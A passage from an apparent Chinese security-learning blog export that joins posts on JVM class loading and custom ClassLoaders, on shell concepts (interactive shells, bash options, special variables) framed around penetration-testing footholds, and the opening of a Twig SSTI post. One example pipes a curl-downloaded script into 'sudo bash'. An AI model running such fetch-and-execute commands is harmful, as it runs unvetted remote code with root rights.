元数据验证（例如：这个类是否有父类，这个类的父类是否继承了不允许被继承的类（被final修饰的类）） 字节码验证（例如：保证任何跳转指令都不会跳转到方法体以外的字节码指令上） 符号引用验证（例如：符号引用中通过字符串描述的全限定名是否能找到对应的类） 具体的验证过程大家可以参考相关文档，这里也不做展开了 准备（Preparation） “准备阶段是正式为类中定义的变量（即静态变量，被static修饰的变量）分配内存并设置类变量初始值的阶段” 要强调的是，准备阶段仅仅为一个类的静态变量所分配内存，以及根据其类型设置初始值，任何额外的赋值都会在类被初始化之后才会进行，例如以下静态变量，在准备阶段过后会被赋予初始值0而不是123，因为此时尚未执行任何Java方法（构造器没有被调用），123的赋值要等到累的初始化阶段才会进行。 public static int value = 123; 这里有一种特殊情况，即字段属性表中存在ConstantValue属性，即用 static final 表示的常量，在准备阶段就会赋予其最终的赋值，即123 public static final int value = 123; 解析（Resolution） 解析阶段是Java虚拟机将常量池内的符号引用替换为直接引用的过程，分为符号引用（ Symbolic References）和直接引用（ Direct References），主要完成以下内容的解析 类或接口的解析 字段解析 方法解析 接口方法解析 初始化（Initialization） 初始化是JVM真正开始执行由程序员便携的Java程序代码的阶段，此时JVM的主导权由JVM本身过渡到了应用程序。 初始化阶段 顾名思义就是来给之前在 准备阶段 进行初始零值赋值之后的变量进行初始化； 这时，Javac编译器将会自动构造一个方法： \u0026lt;clinit\u0026gt;(),其主要由编译器自动收集类的定义中所有的 静态变量赋值 以及 静态语句块（static{}块） 结合而成的。 我们可以观察一下下面两组代码，分别是有静态变量赋值的和没有静态变量赋值的情况， .class 中就会有 \u0026lt;clinit\u0026gt;() 的区别 public class HelloWorld { public HelloWorld() { } public static void main(String[] args) { HelloWorld helloWorld = new HelloWorld(); System.out.println(\u0026#34;Hello world!\u0026#34;); } } Figure 8: 没有\u0026lt;clinit\u0026gt;()的情况\npublic class HelloWorld { public static int i; public HelloWorld() { } static{ i = 4; } public static void main(String[] args) { HelloWorld helloWorld = new HelloWorld(); System.out.println(\u0026#34;Hello world!\u0026#34;); } } Figure 9: 静态变量赋值生成\u0026lt;clinit\u0026gt;()\n我们在 .class 的字节流中，还可以观察到有一个方法 \u0026lt;init\u0026gt;(),其“是实例构造器方法，对非静态变量解析初始化，在 new 一个对象时调用对象类的 constructor 方法时才会执行 \u0026lt;init\u0026gt;() 方法” 实例化一个类有四种途径： 调用new操作符； 调用 Class 或java.lang.reflect.Constructor 对象的 newInstance() 方法； 调用任何现有对象的 clone() 方法； 通过 java.io.ObjectInputStream 类的getObject() 方法反序列化。 值得注意的是Java编译器会为它的每一个类都至少生成一个实例初始化方法 \u0026lt;init\u0026gt;() 方法。 类加载器 类加载器是一段代码，用来帮助应用程序决定如何获取所需的类，即如何加载到JVM当中去，因此类加载器是在JVM外部实现的。 类与类加载器 类加载器可以用来帮助Java类确定其唯一性：因为一个Java类的唯一性是由 加载它的类加载器 以及 这个类本身 来决定的。 这将体现在针对Class对象的 equals(), isAssignableFrom(), isInstance() 方法的判断结果中。也就是说，要判断两个类是否源于同一个Class文件，只有在他们被同一个类加载器加载的情况下，才有意义。 双亲委派模型 The parent-delegation model 在我们介绍双亲委派模型之前，我们先来说说Java中的类加载器。我们从两个角度来认识这些类加载器： 站在Java虚拟机的角度来看，只存在两种不同的类加载器： 启动类加载器（BootstrapClassLoader） 由C++实现，作为虚拟机自身的一部分 其他所有的加载器 由Java语言实现，独立存在于虚拟机外部 全部继承抽象类 java.lang.ClassLoader 站在Java开发人员的角度，我们可以更加细致地去划分加载器的种类，在JDK 8以及之前的Java版本中，有一个三层加载器的架构： 启动类加载器（Bootstrap Class Loader） 只负责加载存放在 \u0026lt;JAVA_HOME\u0026gt;/lib 目录中的类 亦或者是 java 命令的参数 -Xbootclasspath 所制定的路径中存放的类 同时需要是JVM能够识别的类库，如rt.jar, tools.jar等（如果名字不符合即使放在目录下也无法被加载） Figure 10: \u0026lt;JAVA_HOME\u0026gt;/lib\n扩展类加载器（Extension Class Loader） 由Java代码实现的，实现类为：sun.misc.Launcher$ExtClassLoader 负责加载\u0026lt;JAVA_HOME\u0026gt;/lib/ext中的类库 或者由 java.ext.dirs 系统变量所指定的路径中的所有类库 主要目的是帮助Java系统扩展类库 应用程序类加载器（Application Class Loader） 程序默认的类加载器，又叫“系统类加载器” 负责加载用户类路径（ClassPath）上的所有的类库，ClassPath默认为 java 命令执行的目录的路径 Figure 11: 类加载器双亲委派模型\n接下来我们来介绍 双亲委派模型 The parent-delegation model, 我们先来正确理解一下这个模型的名字，双亲委派模型 The parent-delegation model，这里的“双亲”重点在‘亲’，表示父类，而不在于‘双’（没有两个的意思），其基本原则是，“除了顶层的启动类加载器外，其余的类加载器都应有自己的父类加载器”。 双亲委派模型的工作过程是： 当一个类加载器收到了类加载的请求，它会把这个请求委派（delegate）给 父类（双亲）加载器 去完成，而不是自己先尝试加载 每一个层次的类加载器都是如此，因此所有的类加载都应该被层层委托直到最顶层的 启动类加载器（Bootstrap Class Loader） 只有当父类加载器无法完成这个请求时，子加载器才会尝试自己去完成 这个工作流程乍一听还是比较反直觉的，我们一般可能会觉得能在底层子类完成就不会往上传递，但是双亲委派模型的有点就在于，这样做更容易保证类的唯一性。还记得我们之前提到过一个类的唯一性是需要拥有同样的 类加载器 以及 类本身 来决定的。比如类 java.lang.Object,其存放于 rt.jar 当中，无论在什么条件下，任何类加载器想要加载这个类，都会直接委派给最顶端的 启动类加载器（Bootstrap Class Loader） 来完成，就会减少很多的混乱。 我们可以看看双亲委派模型的实现代码，也是简单易懂的： protected Class\u0026lt;?\u0026gt; loadClass(String name, boolean resolve) throws ClassNotFoundException { synchronized (getClassLoadingLock(name)) { // First, check if the class has already been loaded;首先，检查类是否已经被加载了 Class\u0026lt;?\u0026gt; c = findLoadedClass(name); if (c == null) { long t0 = System.nanoTime(); try { if (parent != null) { c = parent.loadClass(name, false); } else { c = findBootstrapClassOrNull(name); } } catch (ClassNotFoundException e) { // ClassNotFoundException thrown if class not found; // from the non-null parent class loader } if (c == null) { // If still not found, then invoke findClass in order;如果还是没有办法加载，就尝试类本身的findClass方法 // to find the class. long t1 = System.nanoTime(); c = findClass(name); // this is the defining class loader; record the stats sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0); sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1); sun.misc.PerfCounter.getFindClasses().increment(); } } if (resolve) { resolveClass(c); } return c; } } ClassLoader 详解 有了基本的概念之后，我们接着就要结合源码来具体看看我们之前提到的三层ClassLoader的内容，本章节主要参考：一看你就懂，超详细java中的ClassLoader详解 sum.misc.launcher 扩展类加载器（Extension Class Loader） 以及 应用程序类加载器（Application Class Loader） 是定义在 sum.misc.launcher 类中的两个静态类（不需要实例化就可以调用），此类也是JVM的一个入口应用。 下面是其精简化的源码 public class Launcher { private static Launcher launcher = new Launcher(); private static String bootClassPath = System.getProperty(\u0026#34;sun.boot.class.path\u0026#34;); public static Launcher getLauncher() { return launcher; } private ClassLoader loader; public Launcher() { // Create the extension class loader ClassLoader extcl; try { extcl = ExtClassLoader.getExtClassLoader(); } catch (IOException e) { throw new InternalError( \u0026#34;Could not create extension class loader\u0026#34;, e); } // Now create the class loader to use to launch the application try { loader = AppClassLoader.getAppClassLoader(extcl); } catch (IOException e) { throw new InternalError( \u0026#34;Could not create application class loader\u0026#34;, e); } Thread.currentThread().setContextClassLoader(loader); } /* * Returns the class loader used to launch the main application. */ public ClassLoader getClassLoader() { return loader; } /* * The class loader used for loading installed extensions. */ static class ExtClassLoader extends URLClassLoader {} /** * The class loader used for loading from java.class.path. * runs in a restricted security context. */ static class AppClassLoader extends URLClassLoader {} 我们可以观察到在 Launcher() 构造器中： 定义了 extcl 以及 loader 两个变量来获取 Extension 以及 Application 两种类加载器 同时启动类加载器（Bootstrap Class Loader）也暗藏其中，类中的静态变量 bootClassPath 所包含的内容就是 Bootstrap 类加载器所加载的部分 使用下面的代码我们可以查看 sun.boot.class.path 中所包含的文件目录正是我们之前提到的Bootstrap ClassLoader所加载的jar包目录 for (String path : System.getProperty(\u0026#34;sun.boot.class.path\u0026#34;).split(\u0026#34;:\u0026#34;)) { System.out.println(path); } Figure 12: BootstrapClassLoader所加载的核心jar包路径\nExtClassLoader 我们接着来看 ExtClassLoader 的源码，同样是精简部分 /* * The class loader used for loading installed extensions. */ static class ExtClassLoader extends URLClassLoader { static { ClassLoader.registerAsParallelCapable(); } /** * create an ExtClassLoader. The ExtClassLoader is created * within a context that limits which files it can read */ public static ExtClassLoader getExtClassLoader() throws IOException { final File[] dirs = getExtDirs(); try { // Prior implementations of this doPrivileged() block supplied // aa synthesized ACC via a call to the private method // ExtClassLoader.getContext(). return AccessController.doPrivileged( new PrivilegedExceptionAction\u0026lt;ExtClassLoader\u0026gt;() { public ExtClassLoader run() throws IOException { int len = dirs.length; for (int i = 0; i \u0026lt; len; i++) { MetaIndex.registerDirectory(dirs[i]); } return new ExtClassLoader(dirs); } }); } catch (java.security.PrivilegedActionException e) { throw (IOException) e.getException(); } } private static File[] getExtDirs() { String s = System.getProperty(\u0026#34;java.ext.dirs\u0026#34;); File[] dirs; if (s != null) { StringTokenizer st = new StringTokenizer(s, File.pathSeparator); int count = st.countTokens(); dirs = new File[count]; for (int i = 0; i \u0026lt; count; i++) { dirs[i] = new File(st.nextToken()); } } else { dirs = new File[0]; } return dirs; } ...... } for (String path : System.getProperty(\u0026#34;java.ext.dirs\u0026#34;).split(\u0026#34;:\u0026#34;)) { System.out.println(path); } Figure 13: java.ext.dirs目录\n我们可以看到函数 getExtDirs() 得到了Extension ClassLoader所需要加载的目录，即 java.ext.dirs,这也正是我们之前提到过的Extension ClassLoader所加载的目录 AppClassLoader 最后是AppClassLoader的精简源码： /** * The class loader used for loading from java.class.path. * runs in a restricted security context. */ static class AppClassLoader extends URLClassLoader { public static ClassLoader getAppClassLoader(final ClassLoader extcl) throws IOException { final String s = System.getProperty(\u0026#34;java.class.path\u0026#34;); final File[] path = (s == null) ? new File[0] : getClassPath(s); return AccessController.doPrivileged( new PrivilegedAction\u0026lt;AppClassLoader\u0026gt;() { public AppClassLoader run() { URL[] urls = (s == null) ? new URL[0] : pathToURLs(path); return new AppClassLoader(urls, extcl); } }); } ...... } 还是关注目录，即 java.class.path 使用IDEA得到的结果如下 Figure 14: java.class.path目录\n总结一下，我们使用BootstrapClassLoader, ExtClassLoader以及AppClassLoader在本质上其实就是通过查阅相应的环境属性来加载文件 sun.boot.class.path java.ext.dirs java.class.path 父类加载器 我们在了解了每个加载器的作用范围之后，接下来就结合源码以及之前学习过的双亲委派模型来聊聊这三个加载器之间的关系 继续使用上一个HelloWorld.java，并且试图使用 getClassLoader 来获取对应的类的加载器，以及 getParent() 来获取父类加载器 public class ClassLoaderTest { public static void main(String[] args) { ClassLoader cl = HelloWorld.class.getClassLoader(); System.out.println(\u0026#34;HelloWorld\u0026#39;s ClassLoader is :\u0026#34; + cl.toString()); System.out.println(\u0026#34;The parent ClassLoader is :\u0026#34; + cl.getParent().toString()); System.out.println(\u0026#34;The parent\u0026#39;s parent ClassLoader is :\u0026#34; + cl.getParent().getParent().toString()); } } 结果： HelloWorld\u0026#39;s ClassLoader is :sun.misc.Launcher$AppClassLoader@18b4aac2 The parent ClassLoader is :sun.misc.Launcher$ExtClassLoader@4554617c Exception in thread \u0026#34;main\u0026#34; java.lang.NullPointerException at ClassLoaderTest.main(ClassLoaderTest.java:6) 从上面的记过我们可以看出HelloWorld对应的类加载器为 AppClassLoader 这符合我们的认识，即AppClassLoader是默认的类加载器，同时其父类加载器为Extension ClassLoader. 但是，按照我们在双亲委派模型那一节中所学习的，Extension ClassLoader的父类加载器应该是Bootstrap ClassLoader可以为什么这里却报了Null呢？ Null是 getParent() 的结果，因此我们自然而然的就想去看看 getParent() 的源码，其是定义在 ClassLoader 类中的方法： public final ClassLoader getParent() { if (parent == null) return null; SecurityManager sm = System.getSecurityManager(); if (sm != null) { // Check access to the parent class loader // If the caller\u0026#39;s class loader is same as this class loader, // permission check is performed. checkClassLoaderPermission(parent, Reflection.getCallerClass()); } return parent; } 而用于判断的 parent 变量，则是在ClassLoader对象的三个构造器中被赋值的 public abstract class ClassLoader { private final ClassLoader parent; private ClassLoader(Void unused, ClassLoader parent) { this.parent = parent; ... } protected ClassLoader(ClassLoader parent) { this(checkCreateClassLoader(), parent); } protected ClassLoader() { this(checkCreateClassLoader(), getSystemClassLoader()); } } 我们可以观察到在这三种构造器中，对于 parent 的赋值有两种情况 在构造器方法中指定需要该参数 使用 getSystemClassLoader() 默认赋值，即默认使用 AppClassLoader 第一种情况我们已经在之前的 Launcher 类的源码中见过了，即其在初始化 AppClassLoader时，主动地定义了ExtClassLoader为其的父类加载器 ClassLoader extcl; extcl = ExtClassLoader.getExtClassLoader(); loader = AppClassLoader.getAppClassLoader(extcl); public static ClassLoader getAppClassLoader(final ClassLoader extcl) throws IOException { ...... return new AppClassLoader(urls, extcl); } AppClassLoader(URL[] urls, ClassLoader parent) { super(urls, parent, factory); ucp = SharedSecrets.getJavaNetAccess().getURLClassPath(this); ucp.initLookupCache(this); } 相反的，在ExtClassLoader的初始化中，却没有为 parent 变量进行赋值，而使用的是 Null,因此我们可以知道使用 getParent() 来获取 ExtClassLoader的父类加载器为什么是Null了 public ExtClassLoader(File[] dirs) throws IOException { super(getExtURLs(dirs), null, factory); SharedSecrets.getJavaNetAccess(). getURLClassPath(this).initLookupCache(this); } URLClassLoader\u0026amp;ClassLoader：父类加载器不是继承关系 细心的师傅可能会看到 AppClassLoader 以及 ExtClassLoader 在Launcher中的定义都继承自 URLClassLoader 这里单独把这个继承关系拎出来讲也是为了避免把父类加载器和传统的继承关系进行混淆 Figure 15: ClassLoader继承关系\n知道了这个继承关系之后，我们也可以更好的理解为什么ExtClassLoader的父类加载器Bootstrap ClassLoader为什么是用Null来表示了：因为在顶层父类ClassLoader中的 getClassLoader() 方法的注释中就说明了，如果是null就表示bootstrap classLoader. /* * Returns the class loader for the class. Some implementations may use * null to represent the bootstrap class loader. This method will return * null in such implementations if this class was loaded by the bootstrap * class loader. */ public ClassLoader getClassLoader() { ClassLoader cl = getClassLoader0(); if (cl == null) return null; SecurityManager sm = System.getSecurityManager(); if (sm != null) { ClassLoader.checkClassLoaderPermission(cl, Reflection.getCallerClass()); } return cl; } 回归类的加载：loadClass() 相信在上述这么多内容的介绍之后，大家已经对于类加载器的分类，三层结构的关系，类加载器的作用范围都有了比较基础的认识。 我们接下来重新回到最为重要的双亲委派模型，来总结一下加载一个类的过程 protected Class\u0026lt;?\u0026gt; loadClass(String name, boolean resolve) throws ClassNotFoundException { synchronized (getClassLoadingLock(name)) { // First, check if the class has already been loaded;首先，检查类是否已经被加载了 Class\u0026lt;?\u0026gt; c = findLoadedClass(name); if (c == null) { long t0 = System.nanoTime(); try { if (parent != null) { c = parent.loadClass(name, false); } else { c = findBootstrapClassOrNull(name); } } catch (ClassNotFoundException e) { // ClassNotFoundException thrown if class not found; // from the non-null parent class loader } if (c == null) { // If still not found, then invoke findClass in order;如果还是没有办法加载，就尝试类本身的findClass方法 // to find the class. long t1 = System.nanoTime(); c = findClass(name); // this is the defining class loader; record the stats sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0); sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1); sun.misc.PerfCounter.getFindClasses().increment(); } } if (resolve) { resolveClass(c); } return c; } } 执行 findLoadedClass() 来检查类是否已经加载过了 首先尝试委派父类加载器来对类进行加载 显示定义父类加载器，如AppClassLoader的父类加载器ExtClassLoader 默认Bootstrap ClassLoader (null) 如果父类加载器没有加载成功（c=null）,则通过类本身重写的 findClass() 查找 最后如果 resolve 不为null,就使用 resolveClass() 方法来链接生成最终的Class 最后返回被JVM加载之后的 java.lang.Class类对象 自定义ClassLoader 我们之前介绍了三层的类加载器，分别是Bootstrap, Extension以及Application ClassLoader，他们都是用来加载指定的目录下的Class字节流的，可以说是一种 静态加载 模式 接下来我们来看看用户如何自定义一个类加载器，从而 动态 地加载Class字节流，比如从特殊的目录或者从网络上进行加载。 自定义一个ClassLoader有三个步骤 编写一个新的类来继承(extends) 抽象类ClassLoader 重写 findClass() 方法 在 findClass() 方法中调用 defineClass() 方法来将class二进制内容转换成Class对象 比如我们需要加载一个放置在 Home 目录下的类文件 Test.java，然后使用javac命令将其编译得到Test.class文件 public class Test { public void say(){ System.out.println(\u0026#34;Say Hello\u0026#34;); } } 然后我们来编写一个自定义类加载器 HomeClassLoader 来对根目录下的这个类进行加载 import java.io.ByteArrayOutputStream; import java.io.File; import java.io.FileInputStream; import java.io.IOException; public class HomeClassLoader extends ClassLoader { private String homePath; public HomeClassLoader(String path) { homePath = path; } @Override protected Class\u0026lt;?\u0026gt; findClass(String name) throws ClassNotFoundException { String fileName = getFileName(name); File file = new File(homePath, fileName); try { FileInputStream is = new FileInputStream(file); ByteArrayOutputStream bos = new ByteArrayOutputStream(); int len = 0; try { while ((len = is.read()) != -1) { bos.write(len); } } catch (IOException e) { e.printStackTrace(); } byte[] data = bos.toByteArray(); is.close(); bos.close(); return defineClass(name, data, 0, data.length); } catch (IOException e) { e.printStackTrace(); } return super.findClass(name); } private String getFileName(String name) { int index = name.lastIndexOf(\u0026#39;.\u0026#39;); if (index == -1) { return name + \u0026#34;.class\u0026#34;; } else { return name.substring(index + 1) + \u0026#34;.class\u0026#34;; } } } 可以看到我们在这里重写了 findClass() 方法，同时在其中调用了 defineClass() 方法来将字节流转换成Class类 最后我们可以测试一下使用 HomeClassLoader 来加载项目工程之外的根目录下的 Test.class import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class ClassLoaderTest { public static void main(String[] args) { //创建自定义classloader对象。 HomeClassLoader homeLoader = new HomeClassLoader(\u0026#34;/Users/YourName/\u0026#34;); try { //加载class文件 Class c = homeLoader.loadClass(\u0026#34;Test\u0026#34;); if (c != null) { try { Object obj = c.newInstance(); Method method = c.getDeclaredMethod(\u0026#34;say\u0026#34;, null); //通过反射调用Test类的say方法 method.invoke(obj, null); } catch (InstantiationException | IllegalAccessException | NoSuchMethodException | SecurityException | IllegalArgumentException | InvocationTargetException e) { e.printStackTrace(); } } } catch (ClassNotFoundException e) { e.printStackTrace(); } } } 成功执行，关于反射的内容我们将会在新的文章中介绍 总结 本文较为冗长，是Java Sec系列的第一篇文章，主要是介绍了JVM的一些内容，包括： Java文件的编译执行 JVM的平台无关性与语言无关性 了解了Class文件的文件结构与特性 类加载器的分类与作用 JVM类加载机制的核心：双亲委派模型 ClassLoader结构与源码解析 自定义类的构造 学习下来的感觉：虽然一直说Java很安全，但是Class文件的的字节码指令更为全面的功能却增加了风险，同时用户自定义的加载类可能也是可以找到漏洞的地方。 之后在新的文章中，我们会一起学习JVM特别是ClassLoader中的一些漏洞利用以及相关的安全知识。 Reference 深入理解Java虚拟机到底是什么 java什么时候会触发类加载_java中类的加载，及执行顺序 java中类何时被加载_java类在何时被加载 一看你就懂，超详细java中的ClassLoader详解 ClassLoader（类加载机制） 《深入理解Java虚拟机：JVM高级特性与最佳实践》 ","date":"2022-08-21T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/javasec_javabasic_jvmandclassloader/","title":"JavaSec - Java 基础 - JVM与类的加载"},{"content":"浅谈Shell中的小知识 什么是交互式shell和非交互式shell？ 我们在进行渗透测试的时候，往往需要自己构造一个 Interactive 可交互的shell，那么什么是可交互？原本的shell也可以执行命令，为什么不能用，非得想办法构造一个可交互的shell呢？ Interactive shell 交互式shell 我们先来看一下Bash对于 Interactive Shell 的定义: \u0026ldquo;An interactive shell is one started without non-option arguments, unless -s is specified, without specifying the -c option, and whose input and error output are both connected to terminals (as determined by isatty(3)), or one started with the -i option. An interactive shell generally reads from and writes to a user’s terminal. The -s invocation option may be used to set the positional parameters when an interactive shell is started.\u0026rdquo; [1]. 这里提到了两个概念， option, argument; 介绍前先说结论: argument包含option 如果大家尝试过使用C语言与shell交互，应该就会用到如下的代码来对输入的参数进行利用 #include \u0026lt;stdio.h\u0026gt; int main( int argc, char *argv[] ) { if( argc == 2 ) { printf(\u0026#34;The argument supplied is %s\\n\u0026#34;, argv[1]); } else if( argc \u0026gt; 2 ) { printf(\u0026#34;Too many arguments supplied.\\n\u0026#34;); } else { printf(\u0026#34;One argument expected.\\n\u0026#34;); } } argc 表示输入参数的数量， *argv[] 就表示包含输入参数的数组 这里为了一劳永逸，我们再插一嘴，再辨析一下英文文档中的 parameter \u0026amp; argument 的区别： parameter指的是在 定义 函数时的所申明的变量名 argument指的是在 调用 函数时，实际传入的值 例如在下面的例子中，在函数 MyMethod 中所定义的 myParam 就是parameter,而在下面实际调用使用中，将要传入的真实数据就叫做 argument [2]. public void MyMethod(string myParam) { } ... string myArg1 = \u0026#34;this is my argument\u0026#34;; myClass.MyMethod(myArg1); 好，我们赶紧回来shell中的option和argument的定义： arguments 就是包含整一串shell命令的数组，每一个string都可以称为 argument, 和调用c语言脚本时一个道理，第一个参数（0）就是命令的名字，例如\u0026rsquo;ls\u0026rsquo;,同时也被称为 positional parameters; option 同样也是一个argument，但是它们的特殊之处在于option会改变第一个argument的命令的行为，例如 ls -la 中的 \u0026lsquo;-la\u0026rsquo; 就会改变ls的行为 parameter 也是一个argument,其作用时为命令或者其选项提供信息 [3]. $ ls -la /tmp /var/tmp # parameter1= /tmp # parameter2= /var/tmp $ ls -l -- -a # option1 = -l # parameter1 = -a 更多关于 shell parameter 以及 subcommands 的解释也可以参考 [3]. 了解这些内容之后，我们再回过头来解释 Interactive shell的定义，也就是说一个可交互的shell，就是在启动的时候命令后面跟的只有option类型的argument，除非用了 -s 选项并且没有使用 -c, 或者直接使用了 -i 开启了交互模式 -c \u0026lt;string\u0026gt; If the -c option is present, then commands are read from string. If there are arguments after the string, they are assigned to the positional parameters, starting with $0. 如果出现option -c，那么要执行的指令就从-c后面的string中读取，如果string之后还有参数，那么就当作是一条完整的命令来执行 -i If the -i option is present, the shell is interactive. 如果出现-i则开启一个可交互的shell -s If the -s option is present, or if no arguments remain after option processing, then commands are read from the standard input. This option allows the positional parameters to be set when invoking an interactive shell. 如果出现-s，则从标准输入中读取 使用 -s ，就可以从stdin读取需要执行的命令，这么说有一点抽象，难以和-c区分开来，我们来看一个例子 [4]： curl -L https://chef.io/chef/install.sh | sudo bash -s -- -P chefdk 一般来说 -s 选项都以 curl $script_url | bash 的形式来配合使用，目的是为了 执行 下载到的shell; 这里 -- 表示，将后面所有的string都当作要执行的命令（bash -s所下载的install.sh）的argument，而不是当前命令的option,而 -s 则会负责执行下载到的install.sh; 顺便也翻译一下，使用 -c 选项后面需要跟一个string，来表示将要执行的命令，并且后面还有其他的字符串，都会被当作是命令（前面的string）的其他argument(从$0开始)。 总结一下，启动一个交互式的shell，需要命令的argument全部都为option，而不能有parameter，除非使用了 -s (而没有-c) 或者 -i 的情况,并且交互式shell可以接受来自用户的输入和读取,即这个shell需要用户与其互动，输入命令来决定其行动 Non-Interactive shell 非交互式shell 非交互式的shell就正好相反，其不会与用户进行交互，即标准输入和错误流都没有连接到终端（即用户不可见），往往用于脚本的自动化执行，输入则进入专门的log文件中，同时配置文件例如.bashrc, .profile, .zshrc 都不会被执行 [5]. 因此我们在渗透的过程中时常需要去获得一个交互式的shell来看到我们所执行命令的回显信息。 如何区分交互式shell和非交互式shell 我们可以通过交互式shell中所定义的两个变量来进行区分 $PS1 在交互式shell中被定义，有输出的内容，而在非交互式shell中没有被定义，没有输出； $- 在交互式的shell中，输出的字符串包含字符 'i', 非交互式shell中，则不包含\u0026rsquo;i\u0026rsquo; [6]； （如果不明白这两个变量是干什么的也不用着急，我们下面会讲） 可以用下列代码来进行测试 [5]: [[ $- == *i* ]] \u0026amp;\u0026amp; echo ‘Interactive’ || echo ‘not-interactive’ Bash中的特殊变量 $PS*\n那到底什么是 $PS1,看起来像一个变量，叫做 Bash Prompt, 其代表的是命令行的提示符，即我们看到的终端呈现的shell每一行的开头，例如在下面这个shell中，就由三个内容组成： \\s = bash, the name of the shell \\v = 3.2, the version of bash $ 还有类似的： $PS1, primary prompt string, shell界面每次换行后的开头标识符（如果使用了插件进行美化之后，就会发现这个值特别长，就是因为开头标识符变化了）; $PS2, 表示次级的标识符，secondary prompt string，通常为 \u0026gt;; $PS3, 用来指示选中的命令; $PS4, 表示命令在执行的过程中，每一行的输出都会输出 $PS4 的值 [7]; Figure 1: $PS in Bash\n知道了这个之后，我们也就能理解为什么我们通过msf拿到的shell的每一行开头什么都没有，因此被称为非交互式的shell，因为其$PS1没有被定义，也就没有内容可以显示； 我们平时利用一些工具对终端进行自定义美化的时候，应该也是对这些内容进行修改来实现的，大家可以试试看在自己的终端中输出这些内容，可能都是很长的输出； $-\n$- : $-, dollar hyphen, 将会返回当前shell（bash）在开启时，所设定的option，例如当返回是himBH，就表示bash启动时设定了[8]： - H - histexpand: when history expansion is enabled - m - monitor: when job control is enabled - h - hashall: Locate and remember (hash) commands as they are looked up for execution - B - braceexpand: when brace expansion is enabled - i - interactive: when current shell is interactive 这样也就不难理解我们为什么在进行shell是否可交互时可以查看 $- 的值中是否包含i了； $$ : $$会输出当前shell的进程ID或者说PID，每当新开启一个shell的时候，就会产生一个新的进程 $# : $#用来表示一个bash命令的argument数量，例如下面的例子[9]: ```shell $ bash -c ‘echo $#’ _ 1 2 3 ``` 这里的 `_` 下划线表示一个占位符，表示后面的string为命令的arguments，要主要的是，#表示的数字并不会被算进去，因此上面指令的输出为3 \u0026lt;br/\u0026gt; $0 : 显示出当前运行脚本的名字，也就是第一个argument的值； $? : $?表示的是上一条命令的exit code，如果成功执行则为0，如果出现错误，就回事1； $! : $!，dollar exclamation,表示上一个最近一个被执行的任务的PID； $_ : $_表示最近一条指令的最后一个argument； Figure 2: $_指示上一条指令的最后一个argument\n区分\u0026rsquo;terminal\u0026rsquo;, \u0026lsquo;shell\u0026rsquo;, \u0026rsquo;tty\u0026rsquo; 以及 \u0026lsquo;console\u0026rsquo; 我们通过msf获得了一个非交互式的shell之后，很多walkthrough都会教我们将其转换为完全交互式的TTY，那么这个TTY是什么呢？它和shell，console，terminal这些名词到底是什么关系呢？我们就在这里搞搞清楚。 tty \u0026amp; terminal tty是一种实现了除了读写以外额外命令 device file 的设备文件，一般来说，terminal等价于tty。 一些tty是由kernel内核为了硬件设备所提供的，例如键盘输入，在屏幕上输出文字，或者是对输入输出进行传输。 另一种tty被称为 pseudo-ttys, 通常由软件所提供，被称为终端仿真器，例如Xterm，Screen，SSH，等等 Terminal也有一种更为传统的含义，即一个提供人们与电脑进行交互的设备，通常配备键盘以及显示器。 什么是Login Shell和Non-Login Shell? \u0026ldquo;A login shell is one whose first character of argument zero is a -, or one started with the \u0026ndash;login option.\u0026rdquo; [10]. 如何判断？ 判断一个shell是否是login shell的标准就是$0的输出字符串，其第一个字符是否是\u0026rsquo;-\u0026rsquo;，如果是，则是一个login shell; Figure 3: 判断Login shell\n我们也可以通过输入logout命令来进行判断其是否用了 \u0026ndash;login选项，如果可以正常退出，则表示这是一个login shell，如果只能用\u0026rsquo;exit\u0026rsquo; 退出，则表示不是一个login shell Figure 4: Logout\nLogin shell Login shell在启动的时候，会传递$0, 通常就是带\u0026rsquo;-\u0026lsquo;的shell名，例如 \u0026lsquo;-bash\u0026rsquo;, \u0026lsquo;-zsh\u0026rsquo;, Reference [1] ‘What is an Interactive Shell? (Bash Reference Manual)’. https://www.gnu.org/software/bash/manual/html_node/What-is-an-Interactive-Shell_003f.html (accessed Jul. 21, 2022). [2] T. Hansson, ‘Answer to “What’s the difference between an argument and a parameter?”’, Stack Overflow, Oct. 01, 2008. https://stackoverflow.com/a/156787/17534765 (accessed Jul. 21, 2022). [3] jlliagre, ‘Answer to “Difference between terms: ‘option’, ‘argument’, and ‘parameter’?”’, Stack Overflow, Apr. 08, 2016. https://stackoverflow.com/a/36495940/17534765 (accessed Jul. 21, 2022). [4] navigaid, ‘Answer to “What does bash -s do?”’, Stack Overflow, Aug. 15, 2018. https://stackoverflow.com/a/51854728/17534765 (accessed Jul. 22, 2022). [5] ‘Shell Scripting - Interactive and Non-Interactive Shell’, GeeksforGeeks, Jan. 23, 2022. https://www.geeksforgeeks.org/shell-scripting-interactive-and-non-interactive-shell/ (accessed Jul. 22, 2022). [6] 毛英东, ‘什么是交互式shell和非交互式shell?’, 毛英东的个人博客, May 30, 2020. https://www.maoyingdong.com/what_is_a_interactive_shell/index.html (accessed Jul. 22, 2022). [7] V. Gite, ‘How to Change / Set up bash custom prompt (PS1) in Linux’, nixCraft, Jun. 02, 2007. https://www.cyberciti.biz/tips/howto-linux-unix-bash-shell-setup-prompt.html (accessed Jul. 22, 2022). [8] anubhava, ‘Answer to “What does $- mean in Bash?”’, Stack Overflow, Mar. 13, 2017. https://stackoverflow.com/a/42757277/17534765 (accessed Jul. 22, 2022). [9] S. Ganguly, ‘How to Use Special Variables in Bash’. https://linuxhint.com/use-special-variables-in-bash/ (accessed Jul. 22, 2022). ","date":"2022-07-21T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/shell_introduction/","title":"浅谈Shell中的小知识"},{"content":"SSTI 模板注入：Twig(PHP) 接下来我们以Twig为例子具体来了解一下一个模板的工作原理以及可以利用的漏洞 简介与安装 详见官网安装文档：Twig Docs: Introduction Twig 3.x需要PHP版本高于7.2.5 安装 建议通过Composer命令进行安装 composer require \u0026#34;twig/twig:^3.0\u0026#34; 基础的API调用实例 通过require包含twig的项目文件，可以在Twig的命名空间下调用ArrayLoader类来加载模板（例如这里index就是一个模板），以及Environment类创建环境保存配置 render() 方法的第一个参数是用来加载模板的，第二个参数用来对模板中的占位内容进行填充（渲染） 这里 $twig-render 方法就是加载了模板 index, 并在 {{name}} 